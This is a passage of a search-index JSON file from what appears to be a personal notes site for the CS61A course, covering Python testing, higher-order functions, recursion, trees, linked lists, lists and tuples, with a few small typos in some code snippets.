&lt;suite&gt;\n</code></pre>"},{"location":"cs61a%20notes/chap1/#iteration","title":"Iteration","text":"<pre><code>while &lt;expression&gt;:\n    &lt;suite&gt;\n</code></pre>"},{"location":"cs61a%20notes/chap1/#testing","title":"Testing","text":"<p>A test that applies a single function is called a unit test - write (and run) tests immediately after implementing new functions. - even good practice to write some tests before you implement</p>"},{"location":"cs61a%20notes/chap1/#assertions","title":"Assertions","text":"<pre><code>assert fib(8) == 13, 'The 8th Fibonacci number should be 13'\n</code></pre>"},{"location":"cs61a%20notes/chap1/#doctests","title":"Doctests","text":"<p>placing simple tests directly in the docstring Form: like interactive interpreter session <pre><code>def sum_naturals(n):\n    \"\"\"Return the sum of the first n natural numbers.\n    &gt;&gt;&gt; sum_naturals(10)\n    55\n    &gt;&gt;&gt; sum_naturals(100)\n    5050\n    \"\"\"\n    total, k = 0, 1\n    while k &lt;= n:\n        total, k = total + k, k + 1\n    return total\n</code></pre></p> <ul> <li>doctest module <pre><code>from doctest import testmod\ntestmod()\n</code></pre> <pre><code>from doctest import run_docstring_examples\nrun_docstring_examples(sum_naturals, globals(), True)\n</code></pre></li> <li>-m doctest <pre><code>python3 -m doctest &lt;python_source_file&gt;\n</code></pre></li> </ul>"},{"location":"cs61a%20notes/chap1/#16_higher-order_functions","title":"1.6 Higher-Order Functions  <p>Functions that manipulate functions are called higher-order functions. </p> <p>serve as powerful abstraction mechanisms, vastly increasing the expressive power of our language.</p>","text":""},{"location":"cs61a%20notes/chap1/#functions_as_arguments","title":"Functions as Arguments","text":"<p>purpose: generalize</p> <p>summation <pre><code>def summation(n, term):\n    total, k = 0, 1\n    while k &lt;= n:\n        total, k = total + term(k), k + 1\n    return total\n</code></pre> <pre><code>def cube(x):\n    return x*x*x\ndef sum_cubes(n):\n    return summation(n, cube)\n</code></pre> <pre><code>def pi_term(x):\n    return 8 / ((4*x-3) * (4*x-1))\ndef pi_sum(n):\n    return summation(n, pi_term)\n</code></pre></p>"},{"location":"cs61a%20notes/chap1/#functions_as_general_methods","title":"Functions as General Methods","text":"<ul> <li>the generally-used function:    take functions as parameters</li> <li>the specifically-used function:    if necessary, take functions as returned-values to change the form of signature so that can be passed to the generally-used function(which receive functions as parameters) <p>golden ratio <pre><code>def improve(update, close, guess=1):\n    while not close(guess):\n        guess = update(guess)\n    return guess\n\ndef golden_update(guess):\n    return 1/guess + 1\n\ndef square_close_to_successor(guess):\n    return approx_eq(guess * guess, guess + 1)\n\ndef approx_eq(x, y, tolerance=1e-15):\n    return abs(x - y) &lt; tolerance\n\nimprove(golden_update, square_close_to_successor)\n</code></pre></p> </li> </ul> <pre><code>from math import sqrt\nphi = 1/2 + sqrt(5)/2\ndef improve_test():\n    approx_phi = improve(golden_update, square_close_to_successor)\n    assert approx_eq(phi, approx_phi), 'phi differs from its approximation'\nimprove_test()\n</code></pre>"},{"location":"cs61a%20notes/chap1/#negative_consequence","title":"Negative Consequence","text":"<ul> <li>the global frame becomes cluttered with names of small functions, which must all be unique. </li> <li>we are constrained by particular function signatures</li> </ul>"},{"location":"cs61a%20notes/chap1/#nested_definitions","title":"Nested Definitions","text":"<p>square root <pre><code>def sqrt(a):\n    def sqrt_update(x):\n        return average(x, a/x)\n    def sqrt_close(x):\n        return approx_eq(x * x, a)\n    return improve(sqrt_update, sqrt_close)\n</code></pre> Local def statements only affect the current local frame. These functions are only in scope while sqrt is being evaluated</p> <p>Lexical scope the inner functions have access to the names in the environment where they are defined (not where they are called).</p> <p>parent Each user-defined function has a parent environment: the environment in which it was defined. When a user-defined function is called, the frame created has the same parent as that function.</p> <p>Extended Environments An environment can consist of an arbitrarily long chain of frames, which always concludes with the global frame.  chains: - global - f1-&gt;global - f2-&gt;global - f5-&gt;f1-&gt;global</p> <p>also the sequence of finding name binding </p> <p>advantages of lexical scoping - The names of a local function do not interfere with names external to the function in which it is defined - A local function can access the environment of the enclosing function</p>"},{"location":"cs61a%20notes/chap1/#functions_as_returned_values","title":"Functions as Returned Values","text":"<p>function composition <pre><code>def square(x):\n    return x * x\ndef successor(x):\n    return x + 1\ndef compose1(f, g):\n    def h(x):\n        return f(g(x))\n    return h\ndef f(x):\n    \"\"\"Never called.\"\"\"\n    return -x\n\nsquare_successor = compose1(square, successor)\nresult = square_successor(12)\n</code></pre></p>"},{"location":"cs61a%20notes/chap1/#example_newtons_method","title":"Example: Newton's Method","text":"<p>degree root</p> <p>The degree n root of a is x s.t. \\(x^n - a =0\\) <pre><code>def newton_update(f, df):\n    def update(x):\n        return x - f(x) / df(x)\n    return update\n\ndef find_zero(f, df):\n    def near_zero(x):\n        return approx_eq(f(x), 0)\n    return improve(newton_update(f, df), near_zero)\n\ndef power(x, n):\n    \"\"\"Return x * x * x * ... * x for x repeated n times.\"\"\"\n    product, k = 1, 0\n    while k &lt; n:\n        product, k = product * x, k + 1\n    return product\n\ndef nth_root_of_a(n, a):\n    def f(x):\n        return power(x, n) - a\n    def df(x):\n        return n * power(x, n-1)\n    return find_zero(f, df)\n</code></pre></p>"},{"location":"cs61a%20notes/chap1/#currying","title":"Currying","text":"<p>to convert a function that takes multiple arguments into a chain of functions that each take a single argument <pre><code>def curried_pow(x):\n    def h(y):\n        return pow(x, y)\n    return h\n</code></pre> the map pattern applies a single-argument function to a sequence of values <pre><code>def map_to_range(start, end, f):\n    while start &lt; end:\n        print(f(start))\n        start = start + 1\n</code></pre> <pre><code>def curry2(f):\n    \"\"\"Return a curried version of the given two-argument function.\"\"\"\n    def g(x):\n        def h(y):\n            return f(x, y)\n        return h\n    return g\n\ndef uncurry2(g):\n    \"\"\"Return a two-argument version of the given curried function.\"\"\"\n    def f(x, y):\n        return g(x)(y)\n    return f\n</code></pre></p>"},{"location":"cs61a%20notes/chap1/#comparison","title":"comparison","text":"<p>we intend to curry a 2-parameter function, such as f(x, y), so the parameters: f, x, y</p> <p>curried_pow: specific - f(pow): find in global frame</p> <p>curry2: general - f: passed(can be every 2-para func)</p>"},{"location":"cs61a%20notes/chap1/#lambda_expressions","title":"Lambda Expressions","text":"<p>A lambda expression evaluates to a function that has a single return expression as its body. <pre><code>lambda x : f(g(x))\n'''A function that takes x and returns f(g(x))'''\n</code></pre> <pre><code>lambda x : print(x + 1)\n# return None\n</code></pre> Environment Diagram  A lambda function has no intrinsic name (and so Python prints <code>&lt;lambda&gt;</code> for the name)</p> <p>function composition <pre><code>def compose1(f, g):\n    return lambda x: f(g(x))\nf = compose1(lambda x: x * x, lambda y: y + 1)\n</code></pre></p> <pre><code>compose1 = lambda f,g: lambda x: f(g(x))\n</code></pre> <p>reverse function  <pre><code>def search(f):\n    x = 1\n    while True:\n        if f(x):\n            return x    # if not found, return None\n\ndef reverse(f):\n    # return g(y) s.t. g(f(x)) == x\n    # g: lambda y : x (s.t. f(x) == y)\n    # find the x: search(a function judge whether f(x) == y)\n    # the function: lambda x : f(x) == y\n    return lambda y : search(lambda x : f(x) == y)\n</code></pre></p>"},{"location":"cs61a%20notes/chap1/#abstractions_and_first-class_functions","title":"Abstractions and First-Class Functions","text":"<p>functions as abstraction mechanism: express general methods of computing as explicit elements in our programming language</p> <p>programming languages impose restrictions on the ways in which computational elements can be manipulated. Elements with the fewest restrictions are said to have first-class status, such as function  - They may be bound to names. - They may be passed as arguments to functions. - They may be returned as the results of functions. - They may be included in data structures.</p>"},{"location":"cs61a%20notes/chap1/#function_decorators","title":"Function Decorators","text":"<p>A function that takes another function as an input and returns a new function that extends or modifies the behavior of the original function</p> <p>special syntax to apply higher-order functions as part of executing a def statement</p> <p>trace decorator <pre><code>def trace(fn):\n    def wrapped(x):\n        print('-&gt; ', fn, '(', x, ')')\n        return fn(x)\n    return wrapped\n\n@trace\ndef triple(x):\n    return 3 * x\n</code></pre> <pre><code>&gt;&gt;&gt; triple(12)\n-&gt; &lt;function triple at 0x102a39848&gt; ( 12 )\n36\n</code></pre> The name triple is not bound to this function. Instead, the name triple is bound to the returned function value of calling trace on this function.</p> <p>equivalent to: <pre><code>def triple(x):\n    return 3 * x\ntriple = trace(triple)\n</code></pre></p> <p>memoization decorator <pre><code>def memo(f):\n    cache = {}\n    def memoized(*args):\n        immutable_args = deep_convert_to_tuple(args)  # convert *args into a tuple representation\n        if immutable_args not in cache:\n            result = f(*immutable_args)\n            cache[immutable_args] = result\n            return result\n        return cache[immutable_args]\n    return memoized\n</code></pre></p>"},{"location":"cs61a%20notes/chap1/#17_recursive_functions","title":"1.7 Recursive Functions","text":""},{"location":"cs61a%20notes/chap1/#self_reference","title":"Self Reference","text":"<pre><code>&gt;&gt;&gt; def print_sum(x):\n        print(x)\n        def next_sum(y):\n            return print_sum(x + y)\n        return next_sum\n&gt;&gt;&gt; print_sum(1)(2)(3)\n1\n3\n6\n</code></pre> <p>A function is called recursive if the body of the function calls the function itself, either directly or indirectly</p>"},{"location":"cs61a%20notes/chap1/#common_pattern","title":"common pattern","text":"<ul> <li>begins with a Base Case simplest to process.</li> <li>Recursive Calls  the same kind of problem as the original problem but different argument each time.  \u2192 take 1 step to simplify the original problem.</li> <li>parameter: closer to the base case</li> <li>outcome: closer to the final result</li> </ul> <p>Treating a recursive call as a functional abstraction has been called a recursive leap of faith.  simply trust that the simpler cases will work correctly : - relationship of input and output (return) - side-effect (manipulate...)</p>"},{"location":"cs61a%20notes/chap1/#recursion_vs_iteration","title":"Recursion VS Iteration","text":"<p><pre><code>def fact_iter(n):\n    total, k = 1, 1\n    while k &lt;= n:\n        total, k = total * k, k + 1\n    return total\n</code></pre> <pre><code>def fact(n):\n    if n == 1:\n        return 1\n    else:\n        return n * fact(n-1)\n</code></pre> - iterative functions  maintain some local state that changes throughout the course of computation. At any point in the iteration, that state characterizes the result of completed work and the amount of work remaining.  - recursive functions The state of the computation is entirely contained within the structure of the environment, which has      - return values that take the role of <code>total</code>     - binds <code>n</code> to different values in different frames rather than explicitly tracking <code>k</code>.</p>"},{"location":"cs61a%20notes/chap1/#mutual_recursion","title":"Mutual Recursion","text":"<p>When a recursive procedure is divided among two functions that call each other, the functions are said to be mutually recursive. maintaining abstraction within a complicated recursive program.</p> <p>even and odd for non-negative integers</p> <ul> <li>a number is even if it is one more than an odd number</li> <li>a number is odd if it is one more than an even number</li> <li>0 is even <pre><code>def is_odd(n):\n    if n == 0:\n        return False\n    else:\n        return is_even(n - 1)\ndef is_even(n):\n    if n == 0:\n        return True\n    else:\n        return is_odd(n - 1)\n</code></pre> the body of is_odd can be incorporated into that of is_even <pre><code>def is_odd(n):\n    if n == 0:\n        return False\n    else:\n        if n - 1 == 0:\n            return True\n        else:\n            return is_odd(n - 1)\n</code></pre></li> </ul> <p>\u200bStone Game - Alice always removes a single pebble - Bob removes two pebbles if an even number of pebbles is on the table, and one otherwise</p> <p><pre><code> def Alice(n):\n    if n == 0:\n        print(\"Bob wins!\")\n    else:\n        Bob(n - 1)\ndef Bob(n):\n    if n == 0:\n        print(\"Alice wins!\")\n    elif n % 2 == 0:\n        Alice(n - 2)\n    else:\n        Alice(n - 1)\n</code></pre> - decomposition: to encapsulate each strategy in its own function - call each other at the end of each turn: to incorporate the turn-by-turn nature of the game</p> <p>the Luhn Algorithm  <pre><code>def luhn_sum(n):\n    if n &lt; 10:\n        return n\n    all_but_last, last = n // 10, n % 10\n    return 10 * luhn_sum_double(all_but_last) + last\n\ndef luhn_sum_double(n):\n    if n &lt; 10:\n        return n\n    all_but_last, last = n // 10, n % 10\n    return 10 * luhn_sum(all_but_last) + 2 * last\n</code></pre></p>"},{"location":"cs61a%20notes/chap1/#printing_in_recursive_functions","title":"Printing in Recursive Functions","text":"<p>visualize the recursive function</p> <p>cascade <pre><code>def cascade(n):\n    \"\"\"Print a cascade of prefixes of n.\"\"\"\n    if n &lt; 10:\n        print(n)\n    else:\n        print(n)\n        cascade(n//10)\n        print(n)\n</code></pre> <pre><code>def inverse_cascade(n):\n    grow(n)\n    print(n)\n    shrink(n)\ndef f_then_g(n):    # help to implement recursive lambda function\n    if n:\n        f(n)\n        g(n)\ngrow = lambda n : f_then_g(grow, print n //10)\nshrink = lambda n : f_then_g(print, shrink, n // 10)\n</code></pre></p> <p>It is not a rigid requirement that base cases be expressed before recursive calls express more compactly by observing that print(n) is repeated in both clauses of the conditional statement, and therefore can precede it.</p> <pre><code>def cascade(n):\n    \"\"\"Print a cascade of prefixes of n.\"\"\"\n    print(n)\n    if n &gt;= 10:\n        cascade(n//10)\n        print(n)\n</code></pre>"},{"location":"cs61a%20notes/chap1/#tree_recursion","title":"Tree Recursion","text":"<p>a function calls itself more than once</p> <p>Partitions</p> <p>The number of ways to partition n using integers up to m equals 1. the number of ways to partition n-m using integers up to m, and 2. the number of ways to partition n using integers up to m-1. <pre><code>def count_partitions(n, m):\n    \"\"\"Count the ways to partition n using parts up to m.\"\"\"\n    if n == 0:\n        return 1\n    elif n &lt; 0:\n        return 0\n    elif m == 0:\n        return 0\n    else:\n        return count_partitions(n-m, m) + count_partitions(n, m-1)\n</code></pre> exploring different possibilities / cases</p>"},{"location":"cs61a%20notes/chap1/#tail_recursion","title":"Tail Recursion","text":"<p>use extra parameter to keep track of progress so far</p> <p>num splits</p> <pre><code>def num_splits(s, d):\n    \"\"\"Return the number of ways in which s can be partitioned into two\n    sublists that have sums within d of each other.\n\n    &gt;&gt;&gt; num_splits([1, 5, 4], 0)  # splits to [1, 4] and [5]\n    1\"\"\"\n    def difference_so_far(s, difference):\n        if not s:\n            if abs(difference) &lt;= d:\n                return 1\n            else:\n                return 0\n        element = s[0]\n        s = s[1:]\n        return difference_so_far(s, difference + element) + difference_so_far(s, difference - element)\n    return difference_so_far(s, 0)//2\n</code></pre>"},{"location":"cs61a%20notes/chap2/","title":"Chap2","text":""},{"location":"cs61a%20notes/chap2/#chapter_2_building_abstractions_with_data","title":"Chapter 2: Building Abstractions with Data","text":""},{"location":"cs61a%20notes/chap2/#22_data_abstraction","title":"2.2 Data Abstraction  <p>a compound data value can be manipulate as a single conceptual unit, but also has two parts that can be considered individually.</p> <p>The general technique of isolating the parts of a program that deal with how data are represented from the parts that deal with how data are manipulated is a powerful design methodology called data abstraction.</p> <p>These two parts of a program are connected by a small set of functions that implement abstract data in terms of the concrete representation.</p>  <p>Example: Rational Numbers - representation:     constructor     - <code>rational(n, d)</code> returns the rational number with numerator n and denominator d.</p>  <pre><code>selectors\n- `numer(x)` returns the numerator of the rational number x.\n- `denom(x)` returns the denominator of the rational number x.\n</code></pre> <ul> <li>manipulate wishful thinking: We haven't yet said how a rational number is represented. Even so, we could then add, multiply, print, and test equality of rational numbers:</li> </ul> <pre><code>&gt;&gt;&gt; def add_rationals(x, y):\n        nx, dx = numer(x), denom(x)\n        ny, dy = numer(y), denom(y)\n        return rational(nx * dy + ny * dx, dx * dy)\n&gt;&gt;&gt; def mul_rationals(x, y):\n        return rational(numer(x) * numer(y), denom(x) * denom(y))\n&gt;&gt;&gt; def print_rational(x):  \n        print(numer(x), '/', denom(x))\n&gt;&gt;&gt; def rationals_are_equal(x, y):\n        return numer(x) * denom(y) == numer(y) * denom(x)\n</code></pre>","text":""},{"location":"cs61a%20notes/chap2/#abstraction_barriers","title":"Abstraction Barriers","text":"<p>occur whenever a part of the program that can use a higher level function instead uses a function in a lower level. <pre><code>&gt;&gt;&gt; def square_rational(x):\n        return mul_rational(x, x)\n&gt;&gt;&gt; def square_rational_violating_once(x):\n        '''violate one abstraction barrier.'''\n        return rational(numer(x) * numer(x), denom(x) * denom(x))\n&gt;&gt;&gt; def square_rational_violating_twice(x):\n        '''violate two abstraction barrier.'''\n        return [x[0] * x[0], x[1] * x[1]]\n</code></pre></p>"},{"location":"cs61a%20notes/chap2/#the_properties_of_data","title":"The Properties of Data","text":"<p>implement data as functions <pre><code>&gt;&gt;&gt; def pair(x, y):     # constructor \n        \"\"\"Return a function that represents a pair.\"\"\"\n        def get(index):     # selector\n            if index == 0:\n                return x\n            elif index == 1:\n                return y\n        return get\n&gt;&gt;&gt; def select(p, i):\n        \"\"\"Return the element at index i of pair p.\"\"\"\n        return p(i)     # call itself\n&gt;&gt;&gt; p = pair(20, 14)\n&gt;&gt;&gt; select(p, 0)\n20\n&gt;&gt;&gt; select(p, 1)\n14\n</code></pre></p>"},{"location":"cs61a%20notes/chap2/#23_sequences","title":"2.3   Sequences  <p>share common behavior: - Length - Element selection - addition and multiplication: combine and replicate</p>","text":""},{"location":"cs61a%20notes/chap2/#sequence_iteration","title":"Sequence Iteration","text":"<p><pre><code>for &lt;name&gt; in &lt;expression&gt;:\n    &lt;suite&gt;\n</code></pre> executed by the following procedure: 1. Evaluate the header <code>&lt;expression&gt;</code>, which must yield an iterable value. 2. For each element value in that iterable value, in order:    1. Bind <code>&lt;name&gt;</code> to that value in the current frame.    2. Execute the <code>&lt;suite&gt;</code>. <pre><code>&gt;&gt;&gt; s = [1,2,3]\n&gt;&gt;&gt; for i in range(len(s)):\n        s.insert(i,0)\n&gt;&gt;&gt; s\n[0, 0, 0, 1, 2, 3]\n</code></pre> -  will be bound to the last element of the sequence after the for statement is executed.  introduces yet another way in which the environment can be updated by a statement. <p>Sequence unpacking binding multiple names to multiple values in a fixed-length sequence <pre><code>numbers = [1, 2, 3]\na, b, c = numbers\n</code></pre></p> <p><pre><code>pairs = [[1, 2], [2, 2], [2, 3], [4, 4]]\nfor x, y in pairs:\n    if x == y:\n        same_count = same_count + 1\n</code></pre> Ranges <pre><code>range(stop)\nrange(start, stop)\nrange(start, stop, step)\n</code></pre> commonly appear as the expression in a <code>for</code> header to specify the number of times that the suite should be executed use <code>_</code> for the name in the for header if the name is unused in the suite</p>"},{"location":"cs61a%20notes/chap2/#sequence_processing","title":"Sequence Processing","text":"<p>List Comprehensions <pre><code>[&lt;map expression&gt; for &lt;name&gt; in &lt;sequence expression&gt; if &lt;filter expression&gt;]\n</code></pre> 1. evaluates the <code>&lt;sequence expression&gt;</code>, which must return an iterable value.  2. for each element, in order     1. the element value is bound to      2. the filter expression is evaluated     if it yields a true value:        - the map expression is evaluated.         - The values of the map expression are collected into a list. <p>Aggregation aggregate all values in a sequence into a single value built-in: <code>sum</code>, <code>min</code>, <code>max</code>, <code>all</code></p> <ul> <li>sum(iterable[, start]) \u2192 value</li> <li>max(iterable[, key = func]) \u2192 value   <pre><code>max(lst, key = lambda x : 5 - x)\n</code></pre></li> <li>all(iterable) \u2192 bool   <pre><code>all[x &lt; 5 for x in lst]\n</code></pre></li> </ul> <p>Higher-Order Functions <pre><code>def apply_to_all(map_fn, s):\n    return [map_fn(x) for x in s]\n\ndef keep_if(filter_fn, s):\n    return [x for x in s if filter_fn(x)]\n\ndef reduce(reduce_fn, s, initial):\n    reduced = initial\n    for x in s:\n        reduced = reduce_fn(reduced, x)\n    return reduced\n</code></pre> built-in function: <code>map</code>, <code>filter</code>, <code>reduce</code></p>"},{"location":"cs61a%20notes/chap2/#sequence_abstraction","title":"Sequence Abstraction","text":"<p>Membership <code>in</code></p> <p>Slicing</p>"},{"location":"cs61a%20notes/chap2/#strings","title":"Strings","text":"<p>The elements of a string are themselves strings that have only a single character. Python does not have a separate character type</p> <p>Membership <code>in</code> matches substrings rather than elements.</p> <p>Multiline Literals  triple quotes</p> <p>String Coercion A string can be created from any object in Python by calling the str constructor function with an object value as its argument.</p>"},{"location":"cs61a%20notes/chap2/#trees","title":"Trees","text":"<ul> <li>a method for combining data values has a closure property if the result of combination can itself be combined using the same method</li> <li>it permits us to create hierarchical structures\u2014 structures made up of parts, which themselves are made up of parts, and so on.</li> <li>The tree is a fundamental data abstraction that imposes regularity on how hierarchical values are structured and manipulated.</li> </ul>"},{"location":"cs61a%20notes/chap2/#representation","title":"representation","text":"<p>The data abstraction for a tree consists of the constructor <code>tree</code> and the selectors <code>label</code> and <code>branches</code>.</p> <p><pre><code>def tree(root_label, branches=[]):\n    for branch in branches:\n        assert is_tree(branch), 'branches must be trees'\n    return [root_label] + list(branches)\n    #  if branches is a list, this statement is equivalent to \n    # `return [root_lable] + branches` \n\ndef label(tree):\n    return tree[0]  \n\ndef branches(tree):\n    return tree[1:]\n</code></pre> A tree is well-formed only if it has a root label and all branches are also trees. <pre><code>def is_tree(tree):\n    if type(tree) != list or len(tree) &lt; 1:\n        return False\n    for branch in branches(tree):\n        if not is_tree(branch):\n            return False\n    return True\n</code></pre> checks whether or not a tree has branches: <pre><code>def is_leaf(tree):\n    return not branches(tree)\n</code></pre> \u26a0\ufe0fbefore calling is_leaf / lable / branch, must make sure the parameter is a tree ! (using <code>assert</code> to test...)</p>"},{"location":"cs61a%20notes/chap2/#manipulate","title":"manipulate","text":"<ul> <li>nested expressions <pre><code>&gt;&gt;&gt; t = tree(3, [tree(1), tree(2, [tree(1), tree(1)])])\n&gt;&gt;&gt; t\n[3, [1], [2, [1], [1]]]\n</code></pre></li> <li>tree-recursive functions <p>Fibonacci tree <pre><code>&gt;&gt;&gt; def fib_tree(n):\n        if n == 0 or n == 1:\n            return tree(n)\n        else:\n            left, right = fib_tree(n-2), fib_tree(n-1)\n            fib_n = label(left) + label(right)\n            return tree(fib_n, [left, right])\n&gt;&gt;&gt; fib_tree(5)\n[5, [2, [1], [1, [0], [1]]], [3, [1, [0], [1]], [2, [1], [1, [0], [1]]]]]\n</code></pre></p> <p>Partition trees <pre><code>def partition_tree(n, m):\n    \"\"\"Return a partition tree of n using parts of up to m.\"\"\"\n    if n == 0:\n        return tree(True)\n    elif n &lt; 0 or m == 0:\n        return tree(False)\n    else:\n        left = partition_tree(n-m, m)\n        right = partition_tree(n, m-1)\n        return tree(m, [left, right])\n</code></pre> <pre><code>&gt;&gt;&gt; def print_parts(tree, partition=[]):\n        if is_leaf(tree):\n        if label(tree):\n            print(' + '.join(partition))\n        else:\n            left, right = branches(tree)\n            m = str(label(tree))\n            print_parts(left, partition + [m])\n            print_parts(right, partition)\n&gt;&gt;&gt; print_parts(partition_tree(6, 4))\n4 + 2\n4 + 1 + 1\n3 + 3\n3 + 2 + 1\n3 + 1 + 1 + 1\n2 + 2 + 2\n2 + 2 + 1 + 1\n2 + 1 + 1 + 1 + 1\n1 + 1 + 1 + 1 + 1 + 1\n</code></pre> binarization</p> </li> </ul> <p>A common tree transformation called binarization computes a binary tree from an original tree by grouping together adjacent branches.</p> <pre><code>&gt;&gt;&gt; def right_binarize(tree):\n        \"\"\"Construct a right-branching binary tree.\"\"\"\n        if is_leaf(tree):\n            return tree\n        if len(tree) &gt; 2:\n            tree = [tree[0], tree[1:]]\n            return [tree[0]] + [right_binarize(b) for b in tree[1:]]\n&gt;&gt;&gt; right_binarize([1, 2, 3, 4, 5, 6, 7])\n[1, [2, [3, [4, [5, [6, 7]]]]]]\n</code></pre>"},{"location":"cs61a%20notes/chap2/#linked_lists","title":"Linked Lists","text":"<p>A common representation(not built-in) of a sequence constructed from nested pairs is called a linked list.</p> <p></p>"},{"location":"cs61a%20notes/chap2/#representation_1","title":"representation","text":"<ul> <li> <p>A linked list is a pair containing the <code>first element</code> of the sequence and the <code>rest</code> of the sequence. The second element is also a linked list. </p> </li> <li> <p>The rest of the inner-most linked list containing only 4 is 'empty', a value that represents an empty linked list.</p> </li> </ul> <p>\u2192 recursive! <pre><code>empty = 'empty'\n\ndef is_link(s):\n    \"\"\"s is a linked list if it is `empty` or a (first, rest) pair.\"\"\"\n    return s == empty or (len(s) == 2 and is_link(s[1]))\n\ndef link(first, rest):\n    \"\"\"Constructor\"\"\"\n    assert is_link(rest), \"rest must be a linked list.\"\n    return [first, rest]\n\ndef first(s):\n    \"\"\"Selector `first element`\"\"\"\n    assert is_link(s), \"first only applies to linked lists.\"\n    assert s != empty, \"empty linked list has no first element.\"\n    return s[0]\n\ndef rest(s):\n    \"\"\"Selector `rest`\"\"\"\n    assert is_link(s), \"rest only applies to linked lists.\"\n    assert s != empty, \"empty linked list has no rest.\"\n    return s[1]\n</code></pre> construct: <pre><code>four = link(1, link(2, link(3, link(4, empty))))\n</code></pre></p> <p>linked list satisfies the sequence abstraction: <pre><code>def len_link(s):\n    \"\"\"length\"\"\"\n    length = 0\n    while s != empty:\n        s, length = rest(s), length + 1\n    return length\n\ndef getitem_link(s, i):\n    \"\"\"element selection\"\"\"\n    while i &gt; 0:\n        s, i = rest(s), i - 1\n    return first(s)\n</code></pre></p>"},{"location":"cs61a%20notes/chap2/#recursive_manipulation","title":"Recursive manipulation","text":"<pre><code>def len_link_recursive(s):\n    if s == empty:\n        return 0\n    return 1 + len_link_recursive(rest(s))\n\ndef getitem_link_recursive(s, i):\n    if i == 0:\n        return first(s)\n    return getitem_link_recursive(rest(s), i - 1)\n</code></pre> <pre><code>def extend_link(s, t):\n    \"\"\"Return a list with the elements of s followed by those of t.\"\"\"\n    assert is_link(s) and is_link(t)\n    if s == empty:\n        return t\n    else:\n        return link(first(s), extend_link(rest(s), t))\n</code></pre> <pre><code>def apply_to_all_link(f, s):\n    \"\"\"Apply f to each element of s.\"\"\"\n    assert is_link(s)\n    if s == empty:\n        return s\n    else:\n        return link(f(first(s)), apply_to_all_link(f, rest(s)))\n</code></pre> <pre><code>def keep_if_link(f, s):\n    \"\"\"Return a list with elements of s for which f(e) is true.\"\"\"\n    assert is_link(s)\n    if s == empty:\n        return s\n    else:\n        kept = keep_if_link(f, rest(s))\n        if f(first(s)):\n            return link(first(s), kept)\n        else:\n            return kept\n</code></pre> <pre><code>def join_link(s, separator):\n    \"\"\"Return a string of all elements in s separated by separator.\"\"\"\n    if s == empty:\n        return \"\"\n    elif rest(s) == empty:\n        return str(first(s))\n    else:\n        return str(first(s)) + separator + join_link(rest(s), separator)\n</code></pre>"},{"location":"cs61a%20notes/chap2/#recursive_construction","title":"Recursive Construction","text":"<p>Linked lists are particularly useful when constructing sequences incrementally, a situation that arises often in recursive computations. <pre><code>def partitions(n, m):\n    \"\"\"Return a linked list of partitions of n using parts of up to m.\n    Each partition is represented as a linked list.  \n    --&gt; a linked list of linked lists\n    \"\"\"\n    if n == 0:\n        return link(empty, empty) # A list containing the empty partition\n    elif n &lt; 0 or m == 0:\n        return empty\n    else:\n        using_m = partitions(n-m, m)\n        with_m = apply_to_all_link(lambda s: link(m, s), using_m)\n        without_m = partitions(n, m-1)\n        return extend_link(with_m, without_m)\n\ndef print_partitions(n, m):\n    lists = partitions(n, m)\n    strings = apply_to_all_link(lambda s: join_link(s, \" + \"), lists)\n    print(join_link(strings, \"\\n\"))\n</code></pre></p>"},{"location":"cs61a%20notes/chap2/#24_mutable_data","title":"2.4 Mutable Data","text":""},{"location":"cs61a%20notes/chap2/#the_object_metaphor","title":"The Object Metaphor","text":"<p>When we included function values among our data, we acknowledged that data too can have behavior. Functions could be manipulated as data, but could also be called to perform computation.</p> <p>Objects combine data values with behavior. Objects are both information and processes, bundled together to represent the properties, interactions, and behaviors of complex things.</p> <p>The name date is bound to a class. As we have seen, a class represents a kind of value. Individual dates are called instances of that class. Instances can be constructed by calling the class on arguments that characterize the instance. <pre><code>from datetime import date\ntues = date(2014, 5, 13)\n</code></pre> attributes <pre><code>&lt;expression&gt; . &lt;name&gt;\n</code></pre> attribute names are not available in the general environment</p> <p>methods, which are function-valued attributes compute their results from both their arguments and their object <pre><code>&gt;&gt;&gt; tues.strftime('%A, %B %d')\n'Tuesday, May 13'\n</code></pre></p> <p>In fact, all values in Python are objects. That is, all values have behavior and attributes</p>"},{"location":"cs61a%20notes/chap2/#sequence_objects","title":"Sequence Objects","text":""},{"location":"cs61a%20notes/chap2/#list","title":"List","text":"<p>Lists are mutable. Most changes are performed by invoking methods on list objects.</p> <p>\u26a0\ufe0fdistinguish side-effect and return value <pre><code>&gt;&gt;&gt; s = [1, 2, 3, 4]\n&gt;&gt;&gt; s.extend([s.append(9), s.append(10)])\n&gt;&gt;&gt; s\n&gt;&gt;&gt; [1, 2, 3, 4, 9, 10, None, None]\n</code></pre></p> <p>With mutable data, methods called on one name can affect another name at the same time.</p> <p>Lists can be copied using the list constructor function</p>"},{"location":"cs61a%20notes/chap2/#lists_in_environment_diagrams","title":"lists in environment diagrams","text":"<p>append: 1 more element  extend: the number of the elements in the parameter list  addition and slice: shallow copy  slice assignment: delete -&gt; insert  more complex: </p>"},{"location":"cs61a%20notes/chap2/#sharing_and_identity","title":"Sharing and Identity","text":"<pre><code>&gt;&gt;&gt; nest = list(suits) \n&gt;&gt;&gt; nest[0] = suits\n&gt;&gt;&gt; suits.insert(2, 'Joker') \n&gt;&gt;&gt; nest\n[['heart', 'diamond', 'Joker', 'spade', 'club'], 'diamond', 'spade', 'club']\n</code></pre> <p>Identity: <code>is</code>, <code>is not</code> Equality: <code>==</code></p> <p>A list comprehension always creates a new list object</p>"},{"location":"cs61a%20notes/chap2/#tuples","title":"Tuples","text":"<p>immutable sequence</p> <p>tuple literal: separates element expressions by commas. Parentheses are optional but used commonly in practice. <pre><code>&gt;&gt;&gt; 1, 2 + 3\n(1, 5)\n&gt;&gt;&gt; (\"the\", 1, (\"and\", \"only\"))\n('the', 1, ('and', 'only'))\n</code></pre> Empty and one-element tuples <pre><code>&gt;&gt;&gt; () # 0 elements\n()\n&gt;&gt;&gt; (10,) # 1 element\n(10,)\n</code></pre></p> <p><pre><code>&gt;&gt;&gt; code = (\"up\", \"up\", \"down\", \"down\") + (\"left\", \"right\") * 2\n&gt;&gt;&gt; len(code)\n8\n&gt;&gt;&gt; code[3]\n'down'\n&gt;&gt;&gt; code.count(\"down\")\n2\n&gt;&gt;&gt; code.index(\"left\")\n4\n</code></pre> the methods for manipulating the contents of a list are not available for tuples but it is possible to change the value of a mutable element contained within a tuple</p> <p>Tuples are used implicitly in multiple assignment. An assignment of two values to two names creates a two-element tuple and then unpacks it.</p>"},{"location":"cs61a%20notes/chap2/#dictionaries","title":"Dictionaries","text":"<p>A dictionary contains key-value pairs,  